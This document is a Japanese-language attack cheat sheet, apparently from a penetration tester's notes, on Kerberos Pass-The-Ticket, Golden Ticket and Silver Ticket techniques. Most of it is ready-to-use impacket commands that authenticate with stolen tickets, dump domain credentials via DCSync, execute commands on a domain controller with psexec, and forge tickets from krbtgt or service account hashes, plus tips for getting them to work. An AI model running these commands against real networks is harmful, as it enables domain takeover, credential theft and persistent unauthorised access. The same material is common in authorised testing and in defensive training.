# Pass-The-Ticket（PTT）

## 概要

Kerberos チケット（TGT または TGS）を盗み出し、それを使って対象システムへ認証する攻撃手法。NTLM ハッシュを使う Pass-The-Hash と異なり、Kerberos 認証を利用する。

---

## 着火条件

- `.ccache` 形式または `.kirbi` 形式のチケットファイルが手元にある
- DC の TGT（Unconstrained Delegation 攻撃や RBCD 後）
- DCSync 後に secretsdump で取得した krbtgt ハッシュがある（Golden Ticket 作成可能）

---

## チケットの使用方法（Linux）

### 環境変数でチケットを指定

```bash
export KRB5CCNAME=/path/to/ticket.ccache

# チケットを使って SMB アクセス
impacket-smbclient -k -no-pass [DC_FQDN]

# チケットを使って DCSync
impacket-secretsdump -k -no-pass administrator@[DC_FQDN]

# チケットを使ってコマンド実行
impacket-psexec -k -no-pass administrator@[DC_FQDN]
```

### チケットの確認

```bash
# インストールされている場合
klist

# または ccache ファイルを直接確認
python3 -c "
from impacket.krb5.ccache import CCache
cc = CCache.loadFile('/path/to/ticket.ccache')
print(cc)
"
```

---

## Golden Ticket（krbtgt ハッシュから TGT を偽造）

### 着火条件

DCSync または他の手法で `krbtgt` の NTLM ハッシュが取得できた場合。

### Golden Ticket の作成

```bash
impacket-ticketer \
  -nthash [KRBTGT_NTLM_HASH] \
  -domain-sid [DOMAIN_SID] \
  -domain [DOMAIN] \
  Administrator
```

### ドメイン SID の取得

```bash
impacket-getPac -targetUser administrator '[DOMAIN]/[USER]:[PASSWORD]' | grep "Domain SID"
# または
impacket-lookupsid '[DOMAIN]/[USER]:[PASSWORD]@[DC_IP]' | grep "Domain SID"
```

---

## Silver Ticket（サービスアカウントハッシュから TGS を偽造）

特定のサービス（CIFS, HTTP, LDAP 等）のアカウントハッシュから、そのサービス専用の TGS を偽造する。

```bash
impacket-ticketer \
  -nthash [SERVICE_ACCOUNT_NTLM_HASH] \
  -domain-sid [DOMAIN_SID] \
  -domain [DOMAIN] \
  -spn [SPN] \
  Administrator
```

---

## 注意点・落とし穴

- チケットには有効期限がある（TGT は通常 10 時間、TGS は通常 1 時間）
- 時刻のずれが 5 分を超えると `KRB_AP_ERR_SKEW` エラーが発生する → `sudo ntpdate [DC_IP]` で同期
- `KRB5CCNAME` のパスに `$` が含まれる場合（コンピューターアカウントのccache）はクォートが必要：
  ```bash
  export KRB5CCNAME="DC1\$@DOMAIN_krbtgt@DOMAIN.ccache"
  ```
- `-k -no-pass` オプションセットで Kerberos 認証を使用することを明示する

---

## 関連技術
- TGT の取得 → `../Delegation_Attacks/Unconstrained.md`
- TGS の取得（RBCD後） → `../Delegation_Attacks/RBCD.md`
- krbtgt ハッシュの取得 → `../Credential_Dumping.md`
